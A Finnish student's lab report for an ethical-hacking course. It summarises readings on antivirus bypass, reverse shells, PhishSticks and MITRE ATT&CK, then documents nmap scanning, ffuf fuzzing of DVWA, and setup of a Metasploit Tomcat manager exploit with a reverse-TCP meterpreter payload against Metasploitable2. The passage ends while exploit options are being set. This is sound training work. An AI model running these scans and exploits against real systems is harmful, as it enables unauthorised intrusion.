# h6 Attaaack

Teht√§vien tekemiseen k√§ytettiin p√∂yt√§konetta:

- Prosessori: AMD Ryzen 5 3600 6-Core Processor 3.59 GHz
- Kovalevy: 256 GB M.2 SSD, 512 GB SSD
- Muisti: 32GB RAM
- K√§ytt√∂j√§rjestelm√§: Windows 10 Pro
- VirtualBox
  
Lis√§ksi virtuaalikoneita: Kali Linux (valmis paketti, oletusasetuksilla), Metasploitable2

Tarkemmat teht√§v√§nannot osoitteessa *[terokarvinen.com](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h6-attaaack)*
## x) Lue/katso/kuuntele ja tiivist√§. 

Yehoshua and Kosayev 2021: Antivirus Bypass Techniques, luku: Chapter 1: Introduction to the Security Landscape
- haittaohjelmia on lukuisia: esim. virukset, madot, piilohallintaohjelmat, kiristysohjelmat...
- ohjelmat voivat toteuttaa useaa eri m√§√§ritelm√§√§:
    - esim. kiristysohjelman p√§√§tarkoitus on salakirjoittaa k√§ytt√§j√§n tiedostot lunnaita vastaan
    - ohjelma voi toimia my√∂s troijalaisena ja matona, mik√§li se pystyy liikkumaan verkossa sivusuuntaisesti saastuttaen muita koneita (esimerkkin√§ kirjassa WannaCry)
- Antivirusohjelman lis√§ksi k√§ytt√§j√§√§/yrityst√§ voidaan suojata useilla menetelmill√§:
    - EDR (endpoint detection and response): reaaliaikaiset vastaukset jokaisesta tapahtumasta, joka m√§√§ritell√§√§n haitalliseksi
    - palomuuri: verkossa tapahtuvien uhkien monitorointi, esto ja tunnistaminen perustuen ennalta m√§√§r√§ttyihin k√§yt√§nt√∂ihin
    - IDS/IPS (intrusion detection system/intrusion prevention system): tutkitaan verkkotason paketteja, ja etsit√§√§n haitallisia polkuja/kaavoja
    - DLP (data loss prevention): pys√§ytet√§√§n ja raportoidaan, mik√§li arkaluontoista dataa on vuotamassa valtuuttamattomille tahoille
- antivirusohjelmat voidaan luokitella: static, dymanic, heuristic ja unpacking
- staattinen heikoin, vertaa k√§ytt√∂j√§rjestelm√§n tiedostoja (.EXE,.DLL jne.) tietokannan sis√§lt√§miin "signatuureihin", ja sit√§ kautta tunnistaa haittoja
- heuristic edistynyt, m√§√§rittelee tiedostoille tuloksen/pistem√§√§r√§n (score) ker√§√§m√§ll√§ tilastollista analyysi√§, joka yhdist√§√§ staattisen ja dyynaamisen keinot
- antivirusohjelma voidaan kiert√§√§ TCP-protokollaa hy√∂dynt√§en reverse shell ja blind shell keinoin (kyseisen kirjan testaus tehty l√§hiverkossa)
    - reverse shell: hy√∂kk√§√§j√§n koneelle m√§√§ritell√§√§n portti, joka on auki C2 serverill√§, haittaohjelma toimii clientina, joka avaa yhteyden hy√∂kk√§√§j√§n C2 serverille k√§ytt√§en sattumanvaraista porttia, joka avataan kohteen p√§√§ss√§  

Halonen, Rajala ja Ollikainen 2023: PhishSticks Youtube Channel, kahdeksan videota, yhteens√§ noin 15 min
- haittaohjelman testaaminen sovelluskansion sis√§ll√§: listataan tiedostot ja avataan .txt ja .jpg &rarr; ajetaan python skripti, jonka j√§lkeen kaikki tiedotot on salakirjoitettu
- digisparkin testaaminen: laitteen asettaminen koneeseen k√§ynnist√§√§ haittaohjelman automaattisesti, joten tiedostot Documents-kansiossa salataan
- keyloggerin testaaminen: k√§ytt√§en digisparkia injektoidaan komento, joka lataa uhrin koneella PowerShell skriptin ja ajaa sen taustalla, t√§m√§ tekee automaattisesti POST pyynn√∂n et√§serverille log-tiedoston sis√§ll√∂st√§ &rarr; pyynt√∂ hyv√§ksyt√§√§n ja tiedot tallennetaan

Halonen, Rajala ja Ollikainen 2023: PhishSticks Git Repository, sivut:

Revshell
- Company raport tiedosto on linkitetty piilotettuun kansioon payload\
  &rarr; raportti avataan, jolloin ladataan netcat hy√∂kk√§√§j√§n IP-osoitteesta\
  &rarr; reverse shell k√§ynnistet√§√§n
  
Mitigations
- PowerShellin k√§yt√∂n pois p√§√§lt√§ kytkeminen est√§√§ Digisparkin hy√∂tykuormien ajon:
    &rarr; User Configurations v√§lilehdelt√§ Administrative Templates ja System voidaan asettaa mit√§ Windows sovelluksia ei ajeta
- Voidaan my√∂s asettaa Windowsin palomuurin s√§√§nt√∂ihin, jolloin ajo estet√§√§n
- Tehokas tapa on kytke√§ "Run" pois p√§√§lt√§ k√§ytt√§j√§ll√§, t√§m√§ mahdollistaa silloin PowerShellin k√§yt√∂n
  
Installing Windows 10 on a virtual machine
- Microstoftin sivuilta mahdollista ladata .iso tiedosto
- versioksi Windows 10 (64-bit)
- VirtualBox Disk Image kovalevyn tyypiksi ja dynamically allocated
- prosessoreiden m√§√§r√§ksi v√§h. 4 kpl
- custom asennus ja domain join ilman Microsoft k√§ytt√§j√§tili√§

*[Halonen, Rajala ja Ollikainen - PhishSticks](https://github.com/therealhalonen/PhishSticks/)*

MITRE Att&ck Frequently Asked Questions: Part 1. General.

- ATT&CK on tietoalusta kyberhy√∂kk√§√§jien toiminnasta, keskittyy dokumentoimaan toimet ja k√§ytt√§ytymisen koko kyberhy√∂kk√§yksen elinkaaren ajan
- Enterprise keskittyy yritysverkkoihin ja pilveen kohdistuvaan toimintaan, Mobile mobiililaitteisiin kohdistuvaan
- tactics (toimenpiteet/taktiikat) = keskittyv√§t kuvaamaan miksi hy√∂kk√§√§j√§ll√§ on tietty suoritustapa tai sen aliluokka &rarr; on syy suorittaa tietty toimi, jotta p√§√§st√§√§n tavoitteeseen
- techniques (suoritustavat/tekniikat) = keskittyv√§t kuvaamaan miten hy√∂kk√§√§j√§ saavuttaa toimenpiteens√§ (tactic) maalin (esim. aktiivinen skannaaminen)
- prosedures (menetelm√§t) = keskittyv√§t kuvaamaan tietty√§ suoritustavan tai sen aliluokan toteutusta, jota hy√∂kk√§√§j√§ k√§ytt√§√§\
    &rarr; esim. Volatile Cedar on k√§ytt√§nyt DirBusteria ja GoBusteria brute force hy√∂kk√§√§m√§ll√§ web hakemistoihin ja DNS aliverkkotunnuksiin (subdomains)

MITRE Att&ck Enterprise Matrix (muutama esimerkki)
- Persictense: Modify Authentication Process (T1556):
    - hy√∂kk√§√§j√§t voivat muokata autentikointi menetelmi√§ ja prosesseja p√§√§st√§kseen k√§siksi k√§ytt√§j√§tunnuksiin, menetelmi√§ ovat mm. Windowsilla LSASS (Local Security Authentication Server) ja SAM (Security Accounts Manager)
    - 8 alitekniikkaa: Domain Controller Authentication, Password Filter DLL, Network Device Authentication, Reversible Encryption, Multi-Factor Authentication, Hybrid Identity, Network Provider DLL
    - hy√∂kk√§√§jist√§ Ebury voi siepata yksityisi√§ avaimia k√§ytt√§m√§ll√§ ssh-add funktiota (trojanized)
    - estokeinoja esim. monivaiheinen tunnistus

## a) Asenna Windows virtuaalikoneeseen samaan verkkoon hy√∂kk√§yskoneen kanssa. Kokeile, ett√§ saat koneen irrotettua Internetist√§.

### Asennus

Seurasin asennuksessa Ollikaisen PhisSticks repon *[ohjeita](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md)*.

Aloitin lataamalla ISO-tiedoston (Enterprise downloads: English Great Britain, 64-bit) Microsoftin *[sivuilta](https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise)*.

![vm1](https://github.com/jjenska/PenTest/assets/105623785/df5078e6-00d3-4230-8350-ab85675ad458)

Latauksen valmistuttua siirryin VirtualBoxiin ja klikkasin sielt√§ yl√§rivist√§ "New". Sy√∂tin koneen nimeksi haluamani, tyyppi ja versio olivat VirtualBoxissa jo oletuksena Microsoft Windows ja Windows 10 (64-bit), kuten kuvassa n√§kyy:

![vm2](https://github.com/jjenska/PenTest/assets/105623785/9a6e0c86-3edb-46d1-b200-fb90708a417c)

T√§m√§n j√§lkeen klikkasin "Next" ja asetin muistim√§√§r√§ksi 8000MB, sek√§ prosessorien m√§√§r√§ksi 4kpl, kuten Ollikainen ohjeessa suositteli. Windows ilmeisesti vaatii enemm√§n muistia ja prosessoreita py√∂ri√§kseen tehokkaammin, kuin esim. Debian.

![vm3](https://github.com/jjenska/PenTest/assets/105623785/c9b19de9-65fe-41d4-ab09-26ae4e2449c1)

Sen j√§lkeen siirryin seuraavaan ikkunaan, jossa loin virtuaalisen kovalevyn. Ohjeissa koneen koko oli 50GB, mutta p√§√§dyin itse asettamaan 30GB. Tarvisin konetta vain tulevaa teht√§v√§√§ varten, joten uskoin sen riitt√§v√§n tarpeisiini. 

![vm4](https://github.com/jjenska/PenTest/assets/105623785/95bcf01e-99ce-4638-8c45-4f9ec0679d0e)

T√§m√§n j√§lkeen tuli yhteenvetoikkuna, josta klikkasin "Finish". T√§m√§n j√§lkeen asetin virtuaalisen levyn asemaan, eli luodun Windows koneen asetuksista "Settings" -> "Storage", josta klikkasin sinist√§ levyn kuvaa ja oikealta toista levyn kuvaa "Optical Drive" -valikosta "Choose/Create a Virtual Optical Disk...". 

![vm6](https://github.com/jjenska/PenTest/assets/105623785/383ae139-8792-4df3-89b8-de522014b87b)

T√§m√§n ikkunan auettua valitsin vasemmalta ylh√§√§lt√§ "Add", ja etsin hakemistosta kansion, johon olin ladannut ISO-tiedoston. Sen j√§lkeen klikkasin oikean tiedoston kohdalla ja alhaalta "Choose". T√§m√§n j√§lkeen oli aika k√§ynnist√§√§ kone. Ensimm√§isen√§ asennusohjelma kysyi asennuksen kielt√§, aikavy√∂hykett√§ ja n√§pp√§imist√∂n kieliasetusta. Asennuksen oletuksena sai olla englanti, aikavy√∂hykkeeksi valitsin Suomen, jolloin my√∂s n√§pp√§imist√∂ vaihtui automaattisesti suomeksi.

![vm7](https://github.com/jjenska/PenTest/assets/105623785/2646fec4-28a2-423f-8972-3f81e57a732c)

Klikkaamalla "Next" ja "Install now", sain viel√§ ikkunan, jossa pyydettiin hyv√§ksym√§√§n lisenssin ehdot. Raksin ruudun, ett√§ hyv√§ksyn ja "Next". T√§m√§n j√§lkeen oli vaihtoehtona "Upgrade" tai "Custom", valitsin ohjeen mukaan Custom, koska ei ollut aikaisempaa versiota p√§ivitett√§v√§n√§. T√§m√§n j√§lkeen ohjelma kysyi, mihin haluan asentaa Windowsin. Vaihtoehtona oli vain luomani virtuaalinen kovalevy: 

![vm8](https://github.com/jjenska/PenTest/assets/105623785/972a5389-43e6-4326-ba3e-2d19ef0efb38)

T√§m√§n valittuani, l√§hti asennus py√∂rim√§√§n, jossa kestikin tovi. Asennuksen valmistuttua, Windows varmisti, ett√§ alueeni on Suomi.

![vm9](https://github.com/jjenska/PenTest/assets/105623785/96812e58-b059-4f9a-a5f2-09a54b46c2a7)

T√§m√§n j√§lkeen Windows pyysi viel√§ n√§pp√§imist√∂n kielen uudelleen, lis√§ksi tiedusteli haluaisinko my√∂s lis√§t√§ vaihtoehtoisen n√§p√§√§imist√∂n. T√§h√§n skip.

![vm10](https://github.com/jjenska/PenTest/assets/105623785/fc0a4b35-d52f-4024-b8a3-a7118b56aea5)

Vihdoin p√§√§sin luomaan k√§ytt√§j√§n, ensisijaisesti Windows tosin tarjosi kirjautumista Microsoft k√§ytt√§j√§ll√§. Alhaalta vasemmalta l√∂ytyi kuitenkin "Domain join instead", joka johti tavallisen k√§ytt√§j√§tilin luontiin.

![vm11](https://github.com/jjenska/PenTest/assets/105623785/a0933849-9db0-4314-93fd-99e1c5ae7f02)
![vm12](https://github.com/jjenska/PenTest/assets/105623785/fbcfbded-11c3-4eb9-9da5-f456208e2831)

K√§ytt√§j√§nimen sy√∂tt√§misen j√§lkeen t√§ytyi luoda vahva salasana, jonka j√§lkeen viel√§ valita 3 eri turvakysymyst√§ valmiiksi annetuista vaihtoehdoista, ja niihin tietysti omat vastaukset.

![vm13](https://github.com/jjenska/PenTest/assets/105623785/ef5acaaf-5c7b-4a48-ba51-e36075528766)

Vastaan tuli viel√§ useampi kysymys mm. sijaintitietojen k√§yt√∂st√§, ja muusta k√§ytt√§j√§datan hy√∂dynt√§misest√§. N√§ihin valitsin ei kiitos, tai minimivaatimukset:

![vm14](https://github.com/jjenska/PenTest/assets/105623785/8b987c2c-4f21-46ec-86f1-a6b6432e12d8)

Pienen odottelun j√§lkeen kaikki oli vihdoin valmista:

![vm15](https://github.com/jjenska/PenTest/assets/105623785/11c6579a-9494-4aab-98cc-d2eabc3b440d)

### Virtuaaliverkko ja Windowsin internetyhteyden tarkistus

Loin Kalille ja Windowsille oman virtuaaliverkon. T√§m√§ tapahtui VirtualBoxin valikosta "Tools" -> "Network" -> "Host-only Networks" -> "Create". Molempien koneiden asetuksista siirryin Network-v√§lilehdelle, josta asetin "Host-only Adapter".

![vm16](https://github.com/jjenska/PenTest/assets/105623785/09cdde63-d8c2-49e1-a18b-d91beb3124b5)

K√§ynnistin molemmat koneet, ja tarkistin ensin Kalin IP-osoitteen:

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        # ei tarvetta t√§lle (NAT)

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        # t√§ss√§ verkossa Metasploitable2

eth2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.144.4  netmask 255.255.255.0  broadcast 192.168.144.255
        inet6 fe80::811a:420c:e5a7:dae7  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:08:95:ee  txqueuelen 1000  (Ethernet)
        RX packets 32  bytes 6222 (6.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 3426 (3.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 240 (240.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

T√§m√§n j√§lkeen siirryin Windowsin komentokehotteeseen. GitHub repon asennusohjeissa n√§kyikin komento, miten Windowsin IP-osoitetiedot tarkistetaan (```ipconfig```). T√§m√§n j√§lkeen kokeilin pingata Kalin, ja yhteys n√§ytti toimivan, sill√§ kaikki paketit p√§√§tyiv√§t perille:

![vm17](https://github.com/jjenska/PenTest/assets/105623785/a9dd568e-45d5-4409-8993-e4006f7a9188)

Kalilta pingaaminen ei onnistunut, sama ongelma oli repon asennusohjeessa, jossa ep√§iltiin sen johtuvan Windowsin turvallisuusasetuksista. Tarkistin viel√§ Windowsin yhteyden nettiin pingaamalla DNS-palvelimen osoitteen 8.8.8.8.

![vm18](https://github.com/jjenska/PenTest/assets/105623785/1dc6d30e-6175-48bd-99b3-e558547d7580)

Yhteys ei ollut toiminnassa, navigoin viel√§ Edge-selaimeen ja sielt√§ Googleen, joka varmisti saman.

![vm18](https://github.com/jjenska/PenTest/assets/105623785/a2476ae5-032d-4eed-8182-acf7728ac125)

## b) Kokeile PhishSticksin revshell vihamielist√§ tiedostoa, joka avaa k√§√§nteisen shellin hy√∂kk√§√§j√§n koneelle. Selit√§, mit√§ tapahtuu ja miksi. Testaa, ett√§ pysyt antamaan kohdekoneelle komentoja reverse shellin kautta.

Valitettavasti en ehtinyt tehd√§ kyseist√§ teht√§v√§√§.

## d) Laita linkki raporttiisi kurssisivun kommentiksi.

‚òëÔ∏è 

![comment](https://github.com/jjenska/PenTest/assets/105623785/0424832f-0070-4a68-a52f-6e49cc616526)


## c) MITRE Attack Enterprise Matrix: Demonstroi viisi tekniikkaa viidest√§ eri taktiikasta. (Nime√§ k√§ytetyt taktiikat, tekniikat ja alitekniikat. Merkitse my√∂s niiden numerot)

### Taktiikkana Recoinnaissance

#### Tekniikka T1595.002	Vulnerability Scanning (Active Scanning)

Uhreja voidaan skannata haavoittuvuuksien selvitt√§miseksi. N√§it√§ voidaan k√§ytt√§√§ kohdistetussa hy√∂kk√§yksess√§. Haavoittuvuusskannaukset yleens√§ tarkistavat, vastaako kohteen is√§nt√§sovelluksen konfiguraatio (esim. ohjelmisto ja versio) mahdollisesti tietty√§ hy√∂kk√§yst√§, jota hy√∂kk√§√§j√§ saattaa yritt√§√§ k√§ytt√§√§. Haavoittuvuusskannaukset ker√§√§v√§t yleens√§ k√§ynniss√§ olevan ohjelmiston ja versionumerot esim. palvelimen bannereista tai kuuntelevista porteista. *([Mitre - Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/))* T√§h√§n tarkoitukseen hy√∂dynsin Nmap:n "agressiivista" skannausta (```-A```), joka n√§ytt√§√§ portit, ja niiss√§ olevien palveluiden versiot.

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -A 192.168.60.8  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 18:38 EET
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.60.8
Host is up (0.00023s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
# tulosteen rivej√§ poistettu
....
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsCompression, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsTransactions
|   Status: Autocommit
|_  Salt: d|aRXB~uRy-m`yb_710=
# tulosteen rivej√§ poistettu
```
T√§ss√§ otin tarkasteluun portissa 3306 auki olevan MySQL:n, versionumerona 5.0.51a. Kokeilin hakea haavoittuvuutta suoraan Googlesta "MySQL 5.0.51s exploit". T√§ll√§ ensimm√§inen tulos ohjasi suoraan *[Exploit Databaseen](https://www.exploit-db.com/exploits/23077)*, josta selvi√§√§, ett√§ kyseisen n√§in kyseist√§ haavoittuvuutta voidaan hy√∂dynt√§√§ luomalla uusi admin k√§ytt√§j√§ MySQL tietokantaan.

#### Tekniikka T1595.003	Wordlist Scanning (Active Scanning)

T√§m√§ tekniikka k√§ytt√§√§ samankaltaisia menetelmi√§ kuin brute force, mutta sen tarkoituksena on tunnistaa sis√§lt√∂√§ ja infrastruktuuria sen sijaan, ett√§ etsitt√§isiin k√§ytt√∂kelpoisia tunnistetietoja (esim. k√§ytt√§j√§nimi + salasana). N√§iss√§ skannauksissa k√§ytetyt sanalistat voivat sis√§lt√§√§ yleisi√§, yleisesti k√§ytettyj√§ nimi√§ ja tiedostop√§√§tteit√§ tai termej√§, jotka ovat tyypillisi√§ tietylle ohjelmistolle. He voivat hy√∂dynt√§√§ yleisi√§ tai r√§√§t√§l√∂ityj√§ sanalistoja listatakseen verkkosivuston/sovelluksen sivuja ja hakemistoja. *([Mitre - Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003/))*

T√§ss√§ teht√§v√§ss√§ p√§√§tin hy√∂dynt√§√§ Metasploitable2:stakin l√∂ytyv√§√§ Damn Vulnarable Web Application verkkosovellusta. P√§√§tin kokeilla asentaa sen Kalille. GitHub *[reposta](https://github.com/digininja/DVWA)* l√∂ytyi *[ohjevideo](https://www.youtube.com/watch?v=WkyDxNJkgQ4)*, jota seurasin asennuksessa. Sovelluksen olisi vaihtoehtoisesti voinut ajaa Dockerilla.

Ensin kloonasin repon koneelleni

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ git clone https://github.com/digininja/DVWA.git    
```
Ensin sovellus t√§ytyi siirt√§√§ Apachen hakemiston juureen, eli ```/var/www/html```. Kalissa oli Apache valmiina asennettuna.

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo mv DVWA /var/www/html/    
```
Sitten siirryin kyseiseen hakemistoon ja k√§ynnistin Apachen palvelimen.

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo service apache2 start 
```
Palvelimen k√§ynnistys ei ilmoittanut mit√§√§n, joten navigoin localhostiin, jotta n√§in oliko se toiminnassa. Apachen etusivu tuli n√§kyviin, joten se oli k√§ynniss√§. T√§m√§n j√§lkeen testasin polkua ```localhost/DVWA/```. 

![dvwa1](https://github.com/jjenska/PenTest/assets/105623785/79fc303b-4b0b-4e28-87ce-7056511774fc)

Ilmoituksena tuli, ett√§ konfiguraatiotiedostoa ei l√∂ydy. T√§ytyi siis kopioida ````config/config.inc.php.dist``` tiedostoon ```config/config.inc.php```, jotta voidaan konfiguroida oma ymp√§rist√∂. T√§m√§ est√§√§, ett√§ k√§ytt√§j√§t eiv√§t vahingossa p√§ivit√§ omia muutoksiaan (kuten tietokannan salasanoja) GitHubin repoon. Toimin siis ohjeen mukaan:


```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[/var/www/html/DVWA]
‚îî‚îÄ$ ls config 
config.inc.php.dist
                                                                             
‚îå‚îÄ‚îÄ(kali„âøkali)-[/var/www/html/DVWA]
‚îî‚îÄ$ cp config/config.inc.php.dist config/config.inc.php
```
Sitten avasin konfiguraatiotiedoston, jotta pystyin tarkastelemaan sen sis√§lt√∂√§. Tietokannaksi oli m√§√§ritelty MySQL, serveriksi localhost eli 127.0.0.1. Lis√§ksi tuolta l√∂ytyiv√§t tietokanta & k√§ytt√§j√§ "dvwa" ja salasana "p@ssw0rd". Tietokantapalvelu ei ollut viel√§ toiminnassa, joten avasin palvelimen ```sudo service mariadb start```. GitHub reposta l√∂ytyi tiedot, ett√§ koska MariaDB on oletuksena Kalissa (ei MySQL), t√§ytyy siihen luoda uusi k√§ytt√§j√§. Tietokantaan piti yhdist√§√§ root:na, ja ajaa GitHubiin annetut komennot. Avasin erillisen terminaalin, jossa kirjauduin ensin "as root". Komennoksi annettiin "mysql", vaikka kyseess√§ on MariaDB (miksi n√§in, j√§i hieman ep√§selv√§ksi).

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo su -      
[sudo] password for kali: 
‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.11.5-MariaDB-3 Debian n/a

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
T√§m√§n j√§lkeen kopioin jokaisen komennon j√§rjestyksess√§ GitHub:n reposta, ja tarkistin, ett√§ saan vastaukseksi "Query OK".

```console
MariaDB [(none)]> create database dvwa;
Query OK, 1 row affected (0.006 sec)

MariaDB [(none)]> create user dvwa@localhost identified by 'p@ssw0rd';
Query OK, 0 rows affected (0.005 sec)

MariaDB [(none)]> grant all on dvwa.* to dvwa@localhost;
Query OK, 0 rows affected (0.029 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.002 sec)

MariaDB [(none)]> ^DBye
```

K√§ytt√§j√§n pystyi viel√§ tarkistamaan kirjautumalla sis√§√§n.

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ mysql -u dvwa -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.11.5-MariaDB-3 Debian n/a

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use dvwa;
Database changed
MariaDB [dvwa]> 
```

Kaikki n√§ytti toimivan, joten siirryin localhostiin ja setup-sivulle ```/DVWA/setup.php```. Sielt√§ testasin klikkaamalla "create/reset database", joka antoi viestin, ett√§ tietokanta oli luotu. T√§m√§n j√§lkeen sovellus ohjasi sis√§√§nkirjautumissivulle.

![dvwa3](https://github.com/jjenska/PenTest/assets/105623785/cb211950-8bff-43cb-b876-16931067353d)

Kirjautumaan p√§√§si valmiiksi annetuilla tunnuksilla:

```
username: admin
password: password
```

![dvwa4](https://github.com/jjenska/PenTest/assets/105623785/de7c0849-a90e-4f3d-8e5f-e7c0e73a48d9)

Vihdoin p√§√§sin itse teht√§v√§√§n, eli p√§√§tin k√§ytt√§√§ ffuf:a sovelluksen mahdollisten hakemistojen fussaamiseen. P√§√§tin selvitt√§√§, l√∂ytyyk√∂ Kalista valmiiksi sanalistoja, ja l√∂ytyih√§n sielt√§. *[Dokumentaation](https://www.kali.org/tools/wordlists/)* mukaan kaikki sijaitsevat hakemistossa ```/usr/share/wordlists```. Kokeilin tabulaattorilla eri kansioita, ja l√∂ysinkin tutun "common.txt". P√§√§tin testata sit√§. Asetin haettavien tiedostop√§√§tteiden kriteeriksi ```.php```. 


```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://localhost/DVWA/FUZZ.php 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/DVWA/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
login                   [Status: 200, Size: 1342, Words: 77, Lines: 75, Duration: 3ms]
security                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
setup                   [Status: 200, Size: 3743, Words: 296, Lines: 120, Duration: 1ms]
about                   [Status: 200, Size: 3727, Words: 265, Lines: 103, Duration: 4166ms]
:: Progress: [951/951] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```
T√§ss√§ tapauksessa hy√∂kk√§√§j√§√§ kiinnostaisi varmasti tiedosto "setup.php". Ja kuten jo sovelluksen asentamisessa n√§kyi, kyseisen sivun kautta pystyisi esimerkiksi resetoimaan tietokannan. 

### Taktiikkana Privileged Escalation

#### Tekniikka T1068 Exploitation for Privilege Escalation

Kun hy√∂kk√§√§j√§ voi saada aluksi p√§√§syn j√§rjestelm√§√§n, mutta voi toimia alhaisemmilla k√§ytt√∂oikeuksilla, mik√§ est√§√§ h√§nt√§ p√§√§sem√§st√§ k√§siksi tiettyihin resursseihin. *([Mitre - Privileged Escalation](https://attack.mitre.org/techniques/T1068/))* K√§ytin Metasploitable tomcat-haavoittuvuutta luodakseni ensin meterpreter istunnon. L√∂ysin vinkiksi *[artikkelin](https://medium.com/@alexandergts98/using-kali-linux-nessus-and-metasploit-to-test-for-vulnerabilities-6080a8d5214)*, jossa k√§ytiin l√§pi mahdollisuutta ajaa hy√∂tykuormaa Apachen Tomcat palvelimille, joissa on haavoittuvainen "manager application". T√§m√§n kautta voidaan my√∂s korottaa k√§ytt√∂oikeuksia.

Siirryin ensin msfconsoleen ja tein haun:

```console
msf6 > search tomcat deploy                                                                
                                                                                           
Matching Modules                                                                                   
================                                                                                   

   #  Name                                                         Disclosure Date  Rank       Check  Description
   -  ----                                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   2  exploit/multi/http/spring_framework_rce_spring4shell         2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/spring_framework_rce_spring4shell  
```
T√§m√§n j√§lkeen valitsin tuon ensimm√§isen vaihtoehdon, eli "use 0". Tarkistin viel√§, millaisia vaihtoehtoja pit√§isi asettaa.

```console
msf6 exploit(multi/http/tomcat_mgr_deploy) > show options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
# ohjeen mukaan oletus k√§ytt√§j√§nimi ja salasana ovat "tomcat", eli asetetaan ne kohtiin HttpPassword & HttpUsername
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeplo
                                            y will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:por
                                            t][...]
 # t√§m√§ remote host tulisi lis√§t√§ (Metasploitable2 IP)
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/d
                                            ocs/using-metasploit/basics/using-metasploit.html
# t√§h√§n asetetaan oikea remote portti 8180
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
# t√§h√§n asetetaan hy√∂kk√§√§v√§n koneen IP (omassa tapauksessa Kali)
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified) 
   LPORT  4444             yes       The listen port

# tulostetta lyhennetty
```

Eli asetukset ennen exploitia:

```console
msf6 exploit(multi/http/tomcat_mgr_deploy) > set rhosts 192.168.60.9
rhosts => 192.168.60.9
